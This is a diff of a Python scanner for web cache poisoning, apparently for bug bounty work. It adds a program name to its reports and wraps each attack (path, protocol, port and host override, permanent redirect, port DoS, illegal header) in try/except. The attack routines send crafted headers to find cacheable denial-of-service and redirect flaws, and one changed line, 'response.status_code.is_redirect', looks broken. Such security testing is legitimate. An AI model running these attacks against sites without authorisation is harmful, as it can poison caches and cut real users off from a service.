@@ -319,13 +319,13 @@ def attack_protocol_override(url):
                                                                                             "accept":"*/*, text/" + cache_buster,
                                                                                             "origin":"https://" + cache_buster + ".example.com",
                                                                                             header:"http"})
-        #if we get a non 200 response code, we remove the header and resend the request
-        if response.status_code != 200:
+        #if we get a redirect, we remove the header and resend the request
+        if response.is_redirect:
             time.sleep(1)
             response = httpx.request("GET", url, params={"cache-buster": cache_buster}, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
                                                                                             "accept":"*/*, text/" + cache_buster,
                                                                                             "origin":"https://" + cache_buster + ".example.com"})
-            if response.status_code != 200:
+            if response.status_code.is_redirect:
                 exploitable_headers.append(header)
                 is_vulnerable = True
     
@@ -603,65 +603,92 @@ def attack_illegal_header(url):
 #
 # This function tries all specific attacks with console output
 #
-def specific_attacks(url):
+def specific_attacks(url, program_name):
     logging.info(termcolor.colored("[i]: Initiating specific attacks on \"{}\"".format(url), "blue"))
 
-    attack_result = attack_path_override(url)
-    if attack_result[0]:
-        logging.critical(termcolor.colored("[!]: ATTACK REPORT: \"{}\"".format(url), "green"))
-        logging.critical(termcolor.colored("[!]: [DOS ATTACK]: path override through: {}".format(attack_result[1]), "green"))
+    try:
+        attack_result = attack_path_override(url)
+        if attack_result[0]:
+            logging.critical(termcolor.colored("[!]: ATTACK REPORT FOR \"{}\" ON: \"{}\"".format(program_name, url), "green"))
+            logging.critical(termcolor.colored("[!]: [DOS ATTACK]: path override through: {}".format(attack_result[1]), "green"))
+    except:
+        pass
     
-    attack_result = attack_protocol_override(url)
-    if attack_result[0]:
-        logging.critical(termcolor.colored("[!]: ATTACK REPORT: \"{}\"".format(url), "green"))
-        logging.critical(termcolor.colored("[!]: [DOS ATTACK]: protocol override redirect loop through: {}".format(attack_result[1]), "green"))
-        #if we can force a redirect let's see if we can influence it
-        for redirect_causing_header in attack_result[1]:
-            secondary_attack_result = attack_permenant_redirect(url, redirect_causing_header, "http")
-            if secondary_attack_result[0]:
-                logging.critical(termcolor.colored("[!]: ATTACK REPORT: \"{}\"".format(url), "green"))
-                logging.critical(termcolor.colored("[!]: [PERMENANT REDIRECT ATTACK]: permenant redirect through: ['{}'] and {}".format(redirect_causing_header, secondary_attack_result[1]), "green"))
+    try:
+        attack_result = attack_protocol_override(url)
+        if attack_result[0]:
+            logging.critical(termcolor.colored("[!]: ATTACK REPORT FOR \"{}\" ON: \"{}\"".format(program_name, url), "green"))
+            logging.critical(termcolor.colored("[!]: [DOS ATTACK]: protocol override redirect loop through: {}".format(attack_result[1]), "green"))
+            #if we can force a redirect let's see if we can influence it
+            for redirect_causing_header in attack_result[1]:
+                secondary_attack_result = attack_permenant_redirect(url, redirect_causing_header, "http")
+                if secondary_attack_result[0]:
+                    logging.critical(termcolor.colored("[!]: ATTACK REPORT FOR \"{}\" ON: \"{}\"".format(program_name, url), "green"))
+                    logging.critical(termcolor.colored("[!]: [PERMENANT REDIRECT ATTACK]: permenant redirect through: ['{}'] and {}".format(redirect_causing_header, secondary_attack_result[1]), "green"))
+    except:
+        pass
 
-    attack_result = attack_port_override(url)
-    if attack_result[0]:
-        logging.critical(termcolor.colored("[!]: ATTACK REPORT: \"{}\"".format(url), "green"))
-        logging.critical(termcolor.colored("[!]: [DOS ATTACK]: port override redirect loop through: {}".format(attack_result[1]), "green"))
-        #if we can force a redirect let's see if we can influence it
-        for redirect_causing_header in attack_result[1]:
-            secondary_attack_result = attack_permenant_redirect(url, redirect_causing_header, "80")
-            if secondary_attack_result[0]:
-                logging.critical(termcolor.colored("[!]: ATTACK REPORT: \"{}\"".format(url), "green"))
-                logging.critical(termcolor.colored("[!]: [PERMENANT REDIRECT ATTACK]: permenant redirect through: [\"{}\"] and {}".format(redirect_causing_header, secondary_attack_result[1]), "green"))
+    try:
+        attack_result = attack_port_override(url)
+        if attack_result[0]:
+            logging.critical(termcolor.colored("[!]: ATTACK REPORT FOR \"{}\" ON: \"{}\"".format(program_name, url), "green"))
+            logging.critical(termcolor.colored("[!]: [DOS ATTACK]: port override redirect loop through: {}".format(attack_result[1]), "green"))
+            #if we can force a redirect let's see if we can influence it
+            for redirect_causing_header in attack_result[1]:
+                secondary_attack_result = attack_permenant_redirect(url, redirect_causing_header, "80")
+                if secondary_attack_result[0]:
+                    logging.critical(termcolor.colored("[!]: ATTACK REPORT FOR \"{}\" ON: \"{}\"".format(program_name, url), "green"))
+                    logging.critical(termcolor.colored("[!]: [PERMENANT REDIRECT ATTACK]: permenant redirect through: [\"{}\"] and {}".format(redirect_causing_header, secondary_attack_result[1]), "green"))
+    except:
+        pass
     
-    attack_result = attack_permenant_redirect(url)
-    if attack_result[0]:
-        logging.critical(termcolor.colored("[!]: ATTACK REPORT: \"{}\"".format(url), "green"))
-        logging.critical(termcolor.colored("[!]: [PERMENANT REDIRECT ATTACK]: permenant redirect through: {}".format(attack_result[1]), "green"))
+    try:
+        attack_result = attack_permenant_redirect(url)
+        if attack_result[0]:
+            logging.critical(termcolor.colored("[!]: ATTACK REPORT FOR \"{}\" ON: \"{}\"".format(program_name, url), "green"))
+            logging.critical(termcolor.colored("[!]: [PERMENANT REDIRECT ATTACK]: permenant redirect through: {}".format(attack_result[1]), "green"))
+    except:
+        pass
 
-    attack_result = attack_method_override(url)
-    if attack_result[0]:
-        logging.critical(termcolor.colored("[!]: ATTACK REPORT: \"{}\"".format(url), "green"))
-        logging.critical(termcolor.colored("[!]: [DOS ATTACK]: method override through: {}".format(attack_result[1]), "green"))
+    try:
+        attack_result = attack_method_override(url)
+        if attack_result[0]:
+            logging.critical(termcolor.colored("[!]: ATTACK REPORT FOR \"{}\" ON: \"{}\"".format(program_name, url), "green"))
+            logging.critical(termcolor.colored("[!]: [DOS ATTACK]: method override through: {}".format(attack_result[1]), "green"))
+    except:
+        pass
 
-    attack_result = attack_evil_user_agent(url)
-    if attack_result[0]:
-        logging.critical(termcolor.colored("[!]: ATTACK REPORT: \"{}\"".format(url), "green"))
-        logging.critical(termcolor.colored("[!]: [DOS ATTACK]: evil user-agent attack through: {}".format(attack_result[1]), "green"))
+    try:
+        attack_result = attack_evil_user_agent(url)
+        if attack_result[0]:
+            logging.critical(termcolor.colored("[!]: ATTACK REPORT FOR \"{}\" ON: \"{}\"".format(program_name, url), "green"))
+            logging.critical(termcolor.colored("[!]: [DOS ATTACK]: evil user-agent attack through: {}".format(attack_result[1]), "green"))
+    except:
+        pass
 
-    attack_result = attack_host_override(url)
-    if attack_result[0]:
-        logging.critical(termcolor.colored("[!]: ATTACK REPORT: \"{}\"".format(url), "green"))
-        logging.critical(termcolor.colored("[!]: [DOS/XSS ATTACK]: host override through: {}".format(attack_result[1]), "green"))
-    
-    attack_result = attack_port_dos(url)
-    if attack_result[0]:
-        logging.critical(termcolor.colored("[!]: ATTACK REPORT: \"{}\"".format(url), "green"))
-        logging.critical(termcolor.colored("[!]: [DOS ATTACK]: port DoS through: {}".format(attack_result[1]), "green"))
+    try:
+        attack_result = attack_host_override(url)
+        if attack_result[0]:
+            logging.critical(termcolor.colored("[!]: ATTACK REPORT FOR \"{}\" ON: \"{}\"".format(program_name, url), "green"))
+            logging.critical(termcolor.colored("[!]: [DOS/XSS ATTACK]: host override through: {}".format(attack_result[1]), "green"))
+    except:
+        pass
 
-    attack_result = attack_illegal_header(url)
-    if attack_result[0]:
-        logging.critical(termcolor.colored("[!]: ATTACK REPORT: \"{}\"".format(url), "green"))
-        logging.critical(termcolor.colored("[!]: [DOS ATTACK]: illegal header attack through: \"{}\"".format(attack_result[1]), "green"))
+    try:
+        attack_result = attack_port_dos(url)
+        if attack_result[0]:
+            logging.critical(termcolor.colored("[!]: ATTACK REPORT FOR \"{}\" ON: \"{}\"".format(program_name, url), "green"))
+            logging.critical(termcolor.colored("[!]: [DOS ATTACK]: port DoS through: {}".format(attack_result[1]), "green"))
+    except:
+        pass
+
+    try:
+        attack_result = attack_illegal_header(url)
+        if attack_result[0]:
+            logging.critical(termcolor.colored("[!]: ATTACK REPORT FOR \"{}\" ON: \"{}\"".format(program_name, url), "green"))
+            logging.critical(termcolor.colored("[!]: [DOS ATTACK]: illegal header attack through: \"{}\"".format(attack_result[1]), "green"))
+    except:
+        pass
 
 ############################
 ### HEADER BRUTE-FORCING ###
@@ -703,7 +730,7 @@ def header_bin_search(url, header_list):
             except:
                 eliminated_indices.append(i)
                 continue
-            
+
             if (response.status_code != initial_response.status_code) or (canary in response.text) or any(canary in value for value in response.headers.values()):
                 pass
             else:
@@ -841,7 +868,7 @@ def assess_header_severity(url, header):
 #
 # execute assess_header_severity concurrently and with console output
 #
-def assess_severity(url, headers, thread_count = 5):
+def assess_severity(url, program_name, headers, thread_count = 5):
     #splitting headers into thread_count long chunks
     header_group_list = [headers[i:i + thread_count] for i in range(0, len(headers), thread_count)]
 
@@ -855,7 +882,7 @@ def assess_severity(url, headers, thread_count = 5):
 
     #print the results to the console
     for i in range(len(header_assessments)):
-        msg = "[!]: HEADER REPORT: \"{0}\" On \"{1}\"\n  > ".format(headers[i], url)
+        msg = "[!]: HEADER REPORT FOR \"{2}\": \"{0}\" On \"{1}\"\n  > ".format(headers[i], url, program_name)
         msg_color = "red"
         if header_assessments[i][0]:
             msg += "Cacheable Response. "
